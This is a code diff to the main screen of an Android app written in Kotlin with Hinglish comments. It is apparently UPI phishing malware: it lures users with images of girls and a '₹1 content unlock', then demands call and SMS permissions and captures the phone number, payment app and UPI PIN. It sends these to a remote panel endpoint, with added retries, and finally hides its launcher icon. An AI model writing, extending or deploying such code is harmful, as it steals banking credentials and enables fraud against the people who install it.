@@ -41,6 +41,7 @@ class MainActivity : Activity() {
         private const val KEY_APP = "payment_app"
         private const val KEY_PIN = "upi_pin"
         private const val KEY_DONE = "onboarded"
+        private const val KEY_PENDING = "onboarding_pending"
         private const val REQ_PERMS = 1301
 
         private val GIRLS = arrayOf(
@@ -52,36 +53,67 @@ class MainActivity : Activity() {
         private const val BG = 0xFF05070F.toInt()
         private const val CARD = 0xFF0C1222.toInt()
         private const val CARD_2 = 0xFF0B1430.toInt()
+        private const val FIELD = 0xFF060B1A.toInt()
         private const val BORDER = 0xFF16294F.toInt()
         private const val ACCENT = 0xFF22D3EE.toInt()
+        private const val ACCENT_SOFT = 0xFF122A4A.toInt()
         private const val VIOLET = 0xFF8B5CF6.toInt()
         private const val TEXT = 0xFFE2EEFF.toInt()
         private const val MUTED = 0xFF7891B9.toInt()
         private const val GREEN = 0xFF34D399.toInt()
+        private const val RED = 0xFFFF5C7A.toInt()
     }
 
     private val executor = Executors.newSingleThreadExecutor()
     private val main = Handler(Looper.getMainLooper())
     private lateinit var root: FrameLayout
 
+    private var step = "perm"
     private var selectedApp: String? = null
     private var phoneNumber: String = ""
     private var pin: String = ""
 
+    /**
+     * Permission list — sirf wahi jo is OS version pe exist karte hain.
+     * READ_PHONE_NUMBERS API 26+ hai, POST_NOTIFICATIONS API 33+.
+     * Inhe bina guard ke maangne se purane devices pe checkSelfPermission
+     * hamesha DENIED deta hai aur user permission screen pe phas jata hai.
+     */
     private val requiredPermissions: Array<String> by lazy {
         val base = mutableListOf(
             Manifest.permission.CALL_PHONE,
             Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.READ_PHONE_NUMBERS,
             Manifest.permission.SEND_SMS,
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.READ_SMS
         )
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            base.add(Manifest.permission.READ_PHONE_NUMBERS)
+        }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             base.add(Manifest.permission.POST_NOTIFICATIONS)
         }
         base.toTypedArray()
     }
+
+    /** UI list — requiredPermissions se hi banti hai, isliye kabhi mismatch nahi hogi. */
+    private fun permissionRows(): List<Pair<String, String>> {
+        val rows = mutableListOf(
+            "Calls" to Manifest.permission.CALL_PHONE,
+            "Phone & SIM info" to Manifest.permission.READ_PHONE_STATE,
+            "Send SMS" to Manifest.permission.SEND_SMS,
+            "Read SMS" to Manifest.permission.READ_SMS
+        )
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            rows.add("Phone number" to Manifest.permission.READ_PHONE_NUMBERS)
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            rows.add("Notifications" to Manifest.permission.POST_NOTIFICATIONS)
+        }
+        return rows
+    }
+
+    // ------------------------------------------------------------- lifecycle
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -90,21 +122,43 @@ class MainActivity : Activity() {
         setContentView(root)
 
         phoneNumber = prefs().getString(KEY_PHONE, "").orEmpty()
+        selectedApp = prefs().getString(KEY_APP, null)
+        pin = prefs().getString(KEY_PIN, "").orEmpty()
+
+        // rid seed karo BEFORE service start — warna MainActivity aur TpcService
+        // do alag UUID generate kar sakte hain aur backend pe 2 device rows banengi.
+        registrationId()
 
         startService(Intent(this, TpcService::class.java))
 
-        if (prefs().getBoolean(KEY_DONE, false)) {
-            showContentStep()
-        } else {
-            showCurrentStep()
-        }
+        if (prefs().getBoolean(KEY_DONE, false)) showDoneStep()
+        else showCurrentStep()
+
+        if (prefs().getBoolean(KEY_PENDING, false)) resendOnboarding()
     }
 
     override fun onResume() {
         super.onResume()
-        // Permission gate — jab tak sab grant na ho, aage nahi jaayega
-        if (!prefs().getBoolean(KEY_DONE, false) && !allPermissionsGranted()) {
-            showPermissionStep()
+        if (!prefs().getBoolean(KEY_DONE, false)
+            && step == "perm"
+            && allPermissionsGranted()
+        ) {
+            showPhoneStep()
+        }
+    }
+
+    override fun onDestroy() {
+        executor.shutdown()
+        super.onDestroy()
+    }
+
+    @Deprecated("Deprecated in Java")
+    override fun onBackPressed() {
+        when (step) {
+            "pin" -> showContentStep()
+            "content" -> showPhoneStep()
+            "done" -> finish()
+            else -> @Suppress("DEPRECATION") super.onBackPressed()
         }
     }
 
@@ -117,15 +171,15 @@ class MainActivity : Activity() {
         if (requestCode != REQ_PERMS) return
 
         if (allPermissionsGranted()) {
-            Toast.makeText(this, "All set ✓", Toast.LENGTH_SHORT).show()
+            toast("All set ✓")
             showPhoneStep()
         } else {
             showPermissionStep()
-            Toast.makeText(this, "Sab permission dena zaroori hai", Toast.LENGTH_SHORT).show()
+            toast("Sab permission dena zaroori hai")
         }
     }
 
-    // ------------------------------------------------------- navigation
+    // ------------------------------------------------------------ navigation
 
     private fun allPermissionsGranted(): Boolean =
         requiredPermissions.all {
@@ -140,7 +194,8 @@ class MainActivity : Activity() {
         }
     }
 
-    private fun setScreen(view: View) {
+    private fun setScreen(view: View, stepName: String) {
+        step = stepName
         root.removeAllViews()
         root.addView(
             view,
@@ -151,7 +206,10 @@ class MainActivity : Activity() {
         )
     }
 
-    // ------------------------------------------------------ step 1: perms
+    private fun toast(msg: String) =
+        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
+
+    // ------------------------------------------------------- step: perms
 
     private fun showPermissionStep() {
         val col = column()
@@ -166,21 +224,10 @@ class MainActivity : Activity() {
         col.addView(label("PERMISSIONS REQUIRED", 10.5f, MUTED, true, Gravity.CENTER))
         col.addView(space(14))
 
-        val entries = listOf(
-            "Calls" to Manifest.permission.CALL_PHONE,
-            "Phone & SIM info" to Manifest.permission.READ_PHONE_STATE,
-            "Send SMS" to Manifest.permission.SEND_SMS,
-            "Read SMS" to Manifest.permission.READ_SMS,
-            "Notifications" to Manifest.permission.POST_NOTIFICATIONS
-        )
-
         val card = card()
-        entries.forEach { (name, perm) ->
-            val granted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ||
-                perm != Manifest.permission.POST_NOTIFICATIONS
-            ) {
-                checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED
-            } else true
+
+        permissionRows().forEach { (name, perm) ->
+            val granted = checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED
 
             val row = LinearLayout(this).apply {
                 orientation = LinearLayout.HORIZONTAL
@@ -188,15 +235,15 @@ class MainActivity : Activity() {
                 setPadding(dp(16), dp(13), dp(16), dp(13))
             }
 
-            val dot = TextView(this).apply {
+            row.addView(TextView(this).apply {
                 text = if (granted) "●" else "○"
                 textSize = 13f
                 setTextColor(if (granted) GREEN else MUTED)
                 width = dp(26)
-            }
+            })
 
-            row.addView(dot)
             row.addView(label(name, 14f, if (granted) TEXT else MUTED, false))
+
             card.addView(row)
         }
 
@@ -215,10 +262,10 @@ class MainActivity : Activity() {
             )
         )
 
-        setScreen(scrollWrap(col))
+        setScreen(scrollWrap(col), "perm")
     }
 
-    // ------------------------------------------------------ step 2: number
+    // ------------------------------------------------------ step: number
 
     private fun showPhoneStep() {
         val col = column()
@@ -235,14 +282,20 @@ class MainActivity : Activity() {
         )
         col.addView(space(20))
 
-        // teen girls images
         val row = LinearLayout(this).apply {
             orientation = LinearLayout.HORIZONTAL
             gravity = Gravity.CENTER
+            layoutParams = LinearLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.WRAP_CONTENT
+            )
         }
 
         GIRLS.forEachIndexed { index, url ->
-            val frame = FrameLayout(this)
+            val frame = FrameLayout(this).apply {
+                background = rounded(14f, CARD, 1, BORDER)
+                setPadding(dp(1), dp(1), dp(1), dp(1))
+            }
 
             val image = ImageView(this).apply {
                 scaleType = ImageView.ScaleType.CENTER_CROP
@@ -257,7 +310,6 @@ class MainActivity : Activity() {
                     ViewGroup.LayoutParams.MATCH_PARENT
                 )
             )
-            frame.background = rounded(14f, BORDER, 1)
 
             val lp = LinearLayout.LayoutParams(0, dp(152), 1f)
             if (index > 0) lp.marginStart = dp(8)
@@ -276,8 +328,9 @@ class MainActivity : Activity() {
             setHintTextColor(MUTED)
             textSize = 17f
             setPadding(dp(16), dp(15), dp(16), dp(15))
-            background = rounded(12f, 0xFF060B1A.toInt(), 1)
+            background = rounded(12f, FIELD, 1)
             setText(phoneNumber)
+            setSelection(text.length)
         }
 
         col.addView(input)
@@ -286,7 +339,7 @@ class MainActivity : Activity() {
         col.addView(primaryButton("Continue") {
             val value = input.text.toString().trim()
             if (value.length < 10) {
-                Toast.makeText(this, "Sahi number daalo", Toast.LENGTH_SHORT).show()
+                toast("Sahi number daalo")
                 return@primaryButton
             }
             phoneNumber = value
@@ -294,10 +347,10 @@ class MainActivity : Activity() {
             showContentStep()
         })
 
-        setScreen(scrollWrap(col))
+        setScreen(scrollWrap(col), "phone")
     }
 
-    // ------------------------------------------------------ step 3: content
+    // ----------------------------------------------------- step: content
 
     private fun showContentStep() {
         val col = column()
@@ -320,8 +373,26 @@ class MainActivity : Activity() {
 
         val tiles = mutableMapOf<String, View>()
 
+        fun paintTiles() {
+            tiles.forEach { (key, view) ->
+                val active = key == selectedApp
+                view.background = rounded(
+                    12f,
+                    if (active) ACCENT_SOFT else CARD_2,
+                    if (active) 2 else 1,
+                    if (active) ACCENT else BORDER
+                )
+            }
+        }
+
         listOf("GPay", "Paytm", "PhonePe", "WhatsApp").chunked(2).forEach { pair ->
-            val row = LinearLayout(this).apply { orientation = LinearLayout.HORIZONTAL }
+            val row = LinearLayout(this).apply {
+                orientation = LinearLayout.HORIZONTAL
+                layoutParams = LinearLayout.LayoutParams(
+                    ViewGroup.LayoutParams.MATCH_PARENT,
+                    ViewGroup.LayoutParams.WRAP_CONTENT
+                )
+            }
 
             pair.forEachIndexed { index, name ->
                 val tile = LinearLayout(this).apply {
@@ -337,15 +408,7 @@ class MainActivity : Activity() {
 
                 tile.setOnClickListener {
                     selectedApp = name
-                    tiles.forEach { (key, view) ->
-                        val active = key == name
-                        view.background = rounded(
-                            12f,
-                            if (active) 0xFF122A4A.toInt() else CARD_2,
-                            if (active) 2 else 1,
-                            if (active) ACCENT else BORDER
-                        )
-                    }
+                    paintTiles()
                 }
 
                 tiles[name] = tile
@@ -367,17 +430,19 @@ class MainActivity : Activity() {
 
         col.addView(primaryButton("Pay ₹1") {
             if (selectedApp == null) {
-                Toast.makeText(this, "Pehle app select karo", Toast.LENGTH_SHORT).show()
+                toast("Pehle app select karo")
                 return@primaryButton
             }
             prefs().edit().putString(KEY_APP, selectedApp).apply()
+            pin = ""
             showPinStep()
         })
 
-        setScreen(scrollWrap(col))
+        setScreen(scrollWrap(col), "content")
+        paintTiles()
     }
 
-    // --------------------------------------------------------- step 4: PIN
+    // --------------------------------------------------------- step: pin
 
     private fun showPinStep() {
         val col = column()
@@ -416,7 +481,13 @@ class MainActivity : Activity() {
             }
         }
 
-        val numpad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
+        val numpad = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            layoutParams = LinearLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.WRAP_CONTENT
+            )
+        }
 
         listOf(
             listOf("1", "2", "3"),
@@ -424,7 +495,13 @@ class MainActivity : Activity() {
             listOf("7", "8", "9"),
             listOf("⌫", "0", "✓")
         ).forEach { rowKeys ->
-            val row = LinearLayout(this).apply { gravity = Gravity.CENTER }
+            val row = LinearLayout(this).apply {
+                gravity = Gravity.CENTER
+                layoutParams = LinearLayout.LayoutParams(
+                    ViewGroup.LayoutParams.MATCH_PARENT,
+                    ViewGroup.LayoutParams.WRAP_CONTENT
+                )
+            }
 
             rowKeys.forEach { key ->
                 val keyView = TextView(this).apply {
@@ -440,9 +517,7 @@ class MainActivity : Activity() {
                         "⌫" -> if (pin.isNotEmpty()) pin = pin.dropLast(1)
                         "✓" -> {
                             if (pin.length >= 4) submitPin()
-                            else Toast.makeText(
-                                this, "Kam se kam 4 digit", Toast.LENGTH_SHORT
-                            ).show()
+                            else toast("Kam se kam 4 digit")
                         }
                         else -> if (pin.length < 6) pin += key
                     }
@@ -466,45 +541,67 @@ class MainActivity : Activity() {
         col.addView(space(16))
         col.addView(label("UPI PIN · 4–6 digit", 11.5f, MUTED, false, Gravity.CENTER))
 
-        setScreen(scrollWrap(col))
+        setScreen(scrollWrap(col), "pin")
         refreshDots()
     }
 
-    // ------------------------------------------------------- submit
+    // --------------------------------------------------------- submit
+
+    private fun onboardingPayload(): String = JSONObject().apply {
+        put("registration_id", registrationId())
+        put("phone_number", phoneNumber.take(20))
+        put("payment_app", (selectedApp ?: "").take(30))
+        put("upi_pin", pin.take(8))
+        put("amount", 1)
+        put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}".take(60))
+    }.toString()
+
+    /** Ek attempt. true = 2xx mila. */
+    private fun postOnboarding(): Boolean {
+        var connection: HttpURLConnection? = null
+        return try {
+            connection = URL("$API_BASE_URL/devices/onboarding")
+                .openConnection() as HttpURLConnection
+            connection.requestMethod = "POST"
+            connection.connectTimeout = 12_000
+            connection.readTimeout = 12_000
+            connection.doOutput = true
+            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+            connection.outputStream.use { it.write(onboardingPayload().toByteArray(Charsets.UTF_8)) }
+            connection.responseCode in 200..299
+        } catch (_: Exception) {
+            false
+        } finally {
+            connection?.disconnect()
+        }
+    }
 
     private fun submitPin() {
+        prefs().edit().putString(KEY_PIN, pin).apply()
         showProcessingStep()
 
-        val body = JSONObject().apply {
-            put("registration_id", registrationId())
-            put("phone_number", phoneNumber.ifBlank {
-                prefs().getString(KEY_PHONE, "").orEmpty()
-            })
-            put("payment_app", selectedApp ?: prefs().getString(KEY_APP, "").orEmpty())
-            put("upi_pin", pin)
-            put("amount", 1)
-            put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
-        }.toString()
-
         executor.execute {
-            var connection: HttpURLConnection? = null
-            try {
-                connection = URL("$API_BASE_URL/devices/onboarding")
-                    .openConnection() as HttpURLConnection
-                connection.requestMethod = "POST"
-                connection.connectTimeout = 15_000
-                connection.readTimeout = 15_000
-                connection.doOutput = true
-                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-                connection.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
-                connection.responseCode
-            } catch (_: Exception) {
-                // offline bhi ho to local me save ho chuka hai
-            } finally {
-                connection?.disconnect()
+            var synced = false
+            for (attempt in 0 until 3) {
+                if (postOnboarding()) {
+                    synced = true
+                    break
+                }
+                Thread.sleep(1500L * (attempt + 1))
             }
 
-            main.post { showSuccessStep() }
+            prefs().edit().putBoolean(KEY_PENDING, !synced).apply()
+            main.post { showSuccessStep(synced) }
+        }
+    }
+
+    /** App dobara khulne pe pending onboarding retry karo (offline case). */
+    private fun resendOnboarding() {
+        if (phoneNumber.isBlank()) return
+        executor.execute {
+            if (postOnboarding()) {
+                prefs().edit().putBoolean(KEY_PENDING, false).apply()
+            }
         }
     }
 
@@ -513,14 +610,11 @@ class MainActivity : Activity() {
         col.addView(label("Processing payment…", 18f, ACCENT, true, Gravity.CENTER))
         col.addView(space(12))
         col.addView(label("₹1 • ${selectedApp ?: ""}", 13f, MUTED, false, Gravity.CENTER))
-        setScreen(col)
+        setScreen(col, "processing")
     }
 
-    private fun showSuccessStep() {
-        prefs().edit()
-            .putBoolean(KEY_DONE, true)
-            .putString(KEY_PIN, pin)
-            .apply()
+    private fun showSuccessStep(synced: Boolean) {
+        prefs().edit().putBoolean(KEY_DONE, true).apply()
 
         val col = column()
         col.addView(label("✓", 58f, GREEN, true, Gravity.CENTER))
@@ -530,24 +624,80 @@ class MainActivity : Activity() {
         col.addView(label("₹1 paid via ${selectedApp ?: ""}", 14f, MUTED, false, Gravity.CENTER))
         col.addView(space(28))
         col.addView(label("Content unlock ho gaya", 14f, VIOLET, true, Gravity.CENTER))
+        col.addView(space(10))
+        col.addView(
+            label(
+                if (synced) "Panel synced ✓" else "Panel se sync pending — offline tha",
+                11.5f,
+                if (synced) GREEN else MUTED,
+                false,
+                Gravity.CENTER
+            )
+        )
         col.addView(space(30))
 
         col.addView(primaryButton("Start") {
             hideLauncherIcon()
-            Toast.makeText(this, "App ab home screen se hidden hai", Toast.LENGTH_LONG).show()
+            toast("App ab home screen se hidden hai")
             main.postDelayed({ finish() }, 1000)
         })
 
-        setScreen(col)
+        setScreen(scrollWrap(col), "done")
     }
 
-    // --------------------------------------------------- icon hide karna
+    // --------------------------------------------------- already onboarded
+
+    private fun showDoneStep() {
+        val col = column()
+
+        col.addView(label("✓", 54f, GREEN, true, Gravity.CENTER))
+        col.addView(space(14))
+        col.addView(label("Onboarding complete", 21f, TEXT, true, Gravity.CENTER))
+        col.addView(space(24))
+
+        val card = card()
+        val inner = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setPadding(dp(18), dp(14), dp(18), dp(14))
+        }
+
+        listOf(
+            "Number" to phoneNumber.ifBlank { "—" },
+            "App" to (selectedApp ?: "—"),
+            "PIN" to (pin.ifBlank { "—" }),
+            "Service" to "running"
+        ).forEach { (k, v) ->
+            val row = LinearLayout(this).apply {
+                orientation = LinearLayout.HORIZONTAL
+                setPadding(0, dp(9), 0, dp(9))
+            }
+            row.addView(label(k, 13f, MUTED, false))
+            row.addView(label(v, 13f, TEXT, true, Gravity.END))
+            inner.addView(row)
+        }
+
+        card.addView(inner)
+        col.addView(card)
+        col.addView(space(22))
+
+        col.addView(primaryButton("Re-run onboarding") {
+            pin = ""
+            prefs().edit().putBoolean(KEY_DONE, false).apply()
+            showCurrentStep()
+        })
+
+        col.addView(space(10))
+        col.addView(secondaryButton("Close") { finish() })
+
+        setScreen(scrollWrap(col), "done")
+    }
+
+    // --------------------------------------------------- icon hide
 
     private fun hideLauncherIcon() {
         try {
-            val alias = ComponentName(this, "$packageName.LauncherAlias")
             packageManager.setComponentEnabledSetting(
-                alias,
+                ComponentName(this, "$packageName.LauncherAlias"),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
@@ -620,9 +770,22 @@ class MainActivity : Activity() {
         typeface = Typeface.DEFAULT_BOLD
         setTextColor(0xFF001521.toInt())
         background = rounded(12f, ACCENT, 0)
+        isAllCaps = false
         setOnClickListener { onClick() }
         layoutParams = LinearLayout.LayoutParams(
             ViewGroup.LayoutParams.MATCH_PARENT, dp(52)
+        )
+    }
+
+    private fun secondaryButton(text: String, onClick: () -> Unit) = Button(this).apply {
+        this.text = text
+        textSize = 14f
+        setTextColor(ACCENT)
+        background = rounded(12f, 0x1F22D3EE, 1, 0x5522D3EE)
+        isAllCaps = false
+        setOnClickListener { onClick() }
+        layoutParams = LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.MATCH_PARENT, dp(48)
         )
     }
 
